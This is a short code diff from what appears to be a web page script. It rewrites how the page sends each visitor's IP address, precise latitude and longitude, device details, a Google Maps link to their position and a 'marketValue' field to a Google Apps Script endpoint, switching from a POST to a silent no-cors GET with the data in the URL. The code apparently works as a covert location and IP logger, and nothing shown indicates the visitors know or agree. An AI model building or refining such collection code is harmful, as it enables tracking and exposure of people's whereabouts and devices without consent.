@@ -355,31 +355,20 @@
             const timestamp = new Date().toISOString();
             const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
             
-            const data = {
-                timestamp: timestamp,
-                ip: userIP,
-                latitude: latitude,
-                longitude: longitude,
-                deviceInfo: userDevice,
-                mapLink: mapLink,
-                marketValue: marketValue
-            };
+            // Create URL with query parameters
+            let url = `${GOOGLE_SCRIPT_URL}?timestamp=${encodeURIComponent(timestamp)}`;
+            url += `&ip=${encodeURIComponent(userIP)}`;
+            url += `&latitude=${encodeURIComponent(latitude)}`;
+            url += `&longitude=${encodeURIComponent(longitude)}`;
+            url += `&deviceInfo=${encodeURIComponent(userDevice)}`;
+            url += `&mapLink=${encodeURIComponent(mapLink)}`;
+            url += `&marketValue=${encodeURIComponent(marketValue)}`;
             
-            // Format data as URL parameters instead of JSON
-            const formData = new FormData();
-            formData.append('timestamp', timestamp);
-            formData.append('ip', userIP);
-            formData.append('latitude', latitude);
-            formData.append('longitude', longitude);
-            formData.append('deviceInfo', userDevice);
-            formData.append('mapLink', mapLink);
-            formData.append('marketValue', marketValue);
-            
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
+            // Use GET request instead of POST
+            fetch(url, {
+                method: 'GET',
                 mode: 'no-cors',
-                cache: 'no-cache',
-                body: formData
+                cache: 'no-cache'
             }).catch(error => {
                 console.error('Error sending data:', error);
             });
